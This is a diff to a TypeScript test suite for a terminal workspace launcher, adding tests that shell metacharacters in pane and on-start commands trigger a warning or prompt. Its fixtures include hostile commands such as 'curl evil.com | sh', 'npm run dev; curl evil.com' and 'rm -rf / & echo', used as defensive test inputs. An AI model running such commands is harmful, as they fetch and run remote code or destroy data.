@@ -1387,14 +1387,22 @@ describe("path resolution", () => {
 
 describe("shell metacharacter confirmation (#90)", () => {
   let origIsTTY: boolean | undefined;
+  let savedSummonWorkspace: string | undefined;
 
   beforeEach(() => {
     origIsTTY = process.stdin.isTTY;
     Object.defineProperty(process.stdin, "isTTY", { value: true, configurable: true });
+    savedSummonWorkspace = process.env.SUMMON_WORKSPACE;
+    delete process.env.SUMMON_WORKSPACE;
   });
 
   afterEach(() => {
     Object.defineProperty(process.stdin, "isTTY", { value: origIsTTY, configurable: true });
+    if (savedSummonWorkspace === undefined) {
+      delete process.env.SUMMON_WORKSPACE;
+    } else {
+      process.env.SUMMON_WORKSPACE = savedSummonWorkspace;
+    }
   });
 
   it("does not prompt when .summon values are safe", async () => {
@@ -1950,7 +1958,7 @@ describe("shell metacharacter confirmation (#90)", () => {
 
       await expect(launch("/tmp/workspace", { "on-start": "false" })).rejects.toThrow("process.exit");
       expect(mockExit).toHaveBeenCalledWith(1);
-      expect(errorSpy).toHaveBeenCalledWith("on-start command failed: false");
+      expect(errorSpy).toHaveBeenCalledWith(expect.stringContaining("on-start command failed: false"));
 
       logSpy.mockRestore();
       errorSpy.mockRestore();
@@ -2945,5 +2953,331 @@ describe("tree layout + project CWD merge (#185)", () => {
     expect(result.treeLayout).toBeDefined();
     expect(result.treeLayout!.paneCwds).toBeDefined();
     expect(result.treeLayout!.paneCwds!.get("editor")).toBe("app");
+  });
+});
+
+describe("W1: tree pane.* commands metacharacter check (#190)", () => {
+  let origIsTTY: boolean | undefined;
+
+  beforeEach(() => {
+    origIsTTY = process.stdin.isTTY;
+    Object.defineProperty(process.stdin, "isTTY", { value: true, configurable: true });
+  });
+
+  afterEach(() => {
+    Object.defineProperty(process.stdin, "isTTY", { value: origIsTTY, configurable: true });
+  });
+
+  it("prompts when tree pane command contains shell metacharacters", async () => {
+    mockIsCustomLayout.mockReturnValue(true);
+    mockReadCustomLayout.mockReturnValue(
+      new Map([
+        ["tree", "main | sidebar"],
+        ["pane.main", "vim"],
+        ["pane.sidebar", "curl evil.com | sh"],
+      ]),
+    );
+    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
+    mockReadKVFile.mockReturnValue(new Map([["layout", "mywork"]]));
+
+    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
+      cb("y");
+    });
+
+    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+
+    await launch("/tmp/workspace");
+
+    expect(warnSpy).toHaveBeenCalledWith(
+      expect.stringContaining("shell metacharacters"),
+    );
+    warnSpy.mockRestore();
+  });
+
+  it("exits on non-TTY when tree pane command has metacharacters", async () => {
+    Object.defineProperty(process.stdin, "isTTY", { value: false, configurable: true });
+    mockIsCustomLayout.mockReturnValue(true);
+    mockReadCustomLayout.mockReturnValue(
+      new Map([
+        ["tree", "main | sidebar"],
+        ["pane.main", "vim"],
+        ["pane.sidebar", "npm run dev; curl evil.com"],
+      ]),
+    );
+    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
+    mockReadKVFile.mockReturnValue(new Map([["layout", "mywork"]]));
+
+    const mockExit = vi.spyOn(process, "exit").mockImplementation(() => {
+      throw new Error("process.exit");
+    });
+    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+
+    await expect(launch("/tmp/workspace")).rejects.toThrow("process.exit");
+    expect(mockExit).toHaveBeenCalledWith(1);
+
+    mockExit.mockRestore();
+    warnSpy.mockRestore();
+  });
+
+  it("does not prompt when tree pane commands are safe", async () => {
+    mockIsCustomLayout.mockReturnValue(true);
+    mockReadCustomLayout.mockReturnValue(
+      new Map([
+        ["tree", "main | sidebar"],
+        ["pane.main", "vim"],
+        ["pane.sidebar", "lazygit"],
+      ]),
+    );
+    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
+    mockReadKVFile.mockReturnValue(new Map([["layout", "mywork"]]));
+
+    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+
+    await launch("/tmp/workspace");
+
+    const warnMessages = warnSpy.mock.calls.map((c) => c[0] as string);
+    expect(warnMessages.every((m) => !m.includes("shell metacharacters"))).toBe(true);
+    warnSpy.mockRestore();
+  });
+
+  it("skips tree pane metacharacter check in dry-run mode", async () => {
+    mockIsCustomLayout.mockReturnValue(true);
+    mockReadCustomLayout.mockReturnValue(
+      new Map([
+        ["tree", "main | sidebar"],
+        ["pane.main", "vim"],
+        ["pane.sidebar", "curl evil.com | sh"],
+      ]),
+    );
+    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
+    mockReadKVFile.mockReturnValue(new Map([["layout", "mywork"]]));
+    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+
+    await launch("/tmp/workspace", { dryRun: true });
+
+    const warnMessages = warnSpy.mock.calls.map((c) => c[0] as string);
+    expect(warnMessages.every((m) => !m.includes("shell metacharacters"))).toBe(true);
+    logSpy.mockRestore();
+    warnSpy.mockRestore();
+  });
+
+  it("includes tree pane commands alongside .summon dangerous commands", async () => {
+    mockIsCustomLayout.mockReturnValue(true);
+    mockReadCustomLayout.mockReturnValue(
+      new Map([
+        ["tree", "main | sidebar"],
+        ["pane.main", "vim"],
+        ["pane.sidebar", "curl evil.com | sh"],
+      ]),
+    );
+    // Project file also has a dangerous on-start
+    mockReadKVFile.mockReturnValue(
+      new Map([
+        ["layout", "mywork"],
+        ["on-start", "rm -rf / & echo"],
+      ]),
+    );
+    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
+
+    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
+      cb("y");
+    });
+
+    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
+
+    await launch("/tmp/workspace");
+
+    const warnMessages = warnSpy.mock.calls.map((c) => c[0] as string);
+    const metaWarning = warnMessages.find((m) => m.includes("shell metacharacters"));
+    expect(metaWarning).toBeDefined();
+    // Both sources should be listed
+    expect(metaWarning).toContain("pane.sidebar");
+    expect(metaWarning).toContain("on-start");
+
+    warnSpy.mockRestore();
+    logSpy.mockRestore();
+  });
+});
+
+describe("W9: ensureCommand install prompt defaults to No (#190)", () => {
+  it("exits when user presses Enter (default is deny) at install prompt", async () => {
+    let claudeCallCount = 0;
+    mockExecFileSync.mockImplementation((bin: string, args?: string[]) => {
+      if (bin === "/bin/sh" && Array.isArray(args) && args[3] === "claude") {
+        claudeCallCount++;
+        if (claudeCallCount <= 1) throw new Error("not found");
+        return "/usr/bin/claude\n";
+      }
+      if (bin === "/bin/sh" && Array.isArray(args) && args[0] === "-c" && typeof args[1] === "string" && args[1].startsWith("command -v"))
+        return "/usr/bin/stub\n";
+      return "";
+    });
+    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "claude"]]));
+
+    // User presses Enter (empty string)
+    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
+      cb("");
+    });
+
+    const mockExit = vi.spyOn(process, "exit").mockImplementation(() => {
+      throw new Error("process.exit");
+    });
+    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
+
+    await expect(launch("/tmp/workspace")).rejects.toThrow("process.exit");
+    expect(mockExit).toHaveBeenCalledWith(1);
+
+    mockExit.mockRestore();
+    logSpy.mockRestore();
+  });
+
+  it("shows [y/N] prompt (default No) for install", async () => {
+    mockExecFileSync.mockImplementation((bin: string, args?: string[]) => {
+      if (bin === "/bin/sh" && Array.isArray(args) && args[3] === "claude") throw new Error("not found");
+      if (bin === "/bin/sh" && Array.isArray(args) && args[0] === "-c" && typeof args[1] === "string" && args[1].startsWith("command -v"))
+        return "/usr/bin/stub\n";
+      return "";
+    });
+    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "claude"]]));
+
+    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
+      cb("y");
+    });
+
+    const mockExit = vi.spyOn(process, "exit").mockImplementation(() => {
+      throw new Error("process.exit");
+    });
+    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
+
+    // We just need to check the prompt text contains [y/N]
+    try {
+      await launch("/tmp/workspace");
+    } catch {
+      // may exit
+    }
+
+    const promptText = mockQuestion.mock.calls[0]?.[0] as string | undefined;
+    expect(promptText).toBeDefined();
+    expect(promptText).toContain("[y/N]");
+
+    mockExit.mockRestore();
+    logSpy.mockRestore();
+  });
+});
+
+describe("R19: on-start failure includes error message (#190)", () => {
+  it("includes the underlying error message when on-start fails", async () => {
+    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
+    mockExecSync.mockImplementation((cmd: string) => {
+      if (cmd === "broken-command") throw new Error("command not found: broken-command");
+      return "";
+    });
+    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});
+    const mockExit = vi.spyOn(process, "exit").mockImplementation(() => {
+      throw new Error("process.exit");
+    });
+
+    await expect(launch("/tmp/workspace", { "on-start": "broken-command" })).rejects.toThrow("process.exit");
+
+    const errorMessages = errorSpy.mock.calls.map((c) => c[0] as string);
+    const failMsg = errorMessages.find((m) => m.includes("on-start command failed"));
+    expect(failMsg).toBeDefined();
+    expect(failMsg).toContain("command not found: broken-command");
+
+    logSpy.mockRestore();
+    warnSpy.mockRestore();
+    errorSpy.mockRestore();
+    mockExit.mockRestore();
+  });
+});
+
+describe("R24: on-start status message uses stderr (#190)", () => {
+  it("prints on-start status message to stderr (console.warn) not stdout", async () => {
+    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
+    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
+
+    await launch("/tmp/workspace", { "on-start": "echo setup" });
+
+    // The "Running on-start: ..." message should go to stderr (console.warn)
+    const warnMessages = warnSpy.mock.calls.map((c) => c[0] as string);
+    expect(warnMessages.some((m) => m.includes("Running on-start:"))).toBe(true);
+
+    // And NOT to stdout (console.log)
+    const logMessages = logSpy.mock.calls.map((c) => c[0] as string);
+    expect(logMessages.every((m) => !m.includes("Running on-start:"))).toBe(true);
+
+    warnSpy.mockRestore();
+    logSpy.mockRestore();
+  });
+});
+
+describe("R5: maximize/float config layering coverage (#190)", () => {
+  it("resolves maximize from project config", () => {
+    mockReadKVFile.mockReturnValue(new Map([["maximize", "true"]]));
+    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
+
+    const { opts } = resolveConfig("/tmp/workspace", {});
+    expect(opts.maximize).toBe(true);
+  });
+
+  it("resolves float from project config", () => {
+    mockReadKVFile.mockReturnValue(new Map([["float", "true"]]));
+    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
+
+    const { opts } = resolveConfig("/tmp/workspace", {});
+    expect(opts.float).toBe(true);
+  });
+
+  it("CLI maximize overrides project config", () => {
+    mockReadKVFile.mockReturnValue(new Map([["maximize", "false"]]));
+    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
+
+    const { opts } = resolveConfig("/tmp/workspace", { maximize: "true" });
+    expect(opts.maximize).toBe(true);
+  });
+
+  it("CLI float overrides project config", () => {
+    mockReadKVFile.mockReturnValue(new Map([["float", "false"]]));
+    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
+
+    const { opts } = resolveConfig("/tmp/workspace", { float: "true" });
+    expect(opts.float).toBe(true);
+  });
+
+  it("machine config provides maximize when no project config", () => {
+    mockReadKVFile.mockReturnValue(new Map());
+    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"], ["maximize", "true"]]));
+
+    const { opts } = resolveConfig("/tmp/workspace", {});
+    expect(opts.maximize).toBe(true);
+  });
+
+  it("machine config provides float when no project config", () => {
+    mockReadKVFile.mockReturnValue(new Map());
+    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"], ["float", "true"]]));
+
+    const { opts } = resolveConfig("/tmp/workspace", {});
+    expect(opts.float).toBe(true);
+  });
+
+  it("project config overrides machine config for maximize", () => {
+    mockReadKVFile.mockReturnValue(new Map([["maximize", "true"]]));
+    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"], ["maximize", "false"]]));
+
+    const { opts } = resolveConfig("/tmp/workspace", {});
+    expect(opts.maximize).toBe(true);
+  });
+
+  it("project config overrides machine config for float", () => {
+    mockReadKVFile.mockReturnValue(new Map([["float", "true"]]));
+    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"], ["float", "false"]]));
+
+    const { opts } = resolveConfig("/tmp/workspace", {});
+    expect(opts.float).toBe(true);
   });
 });
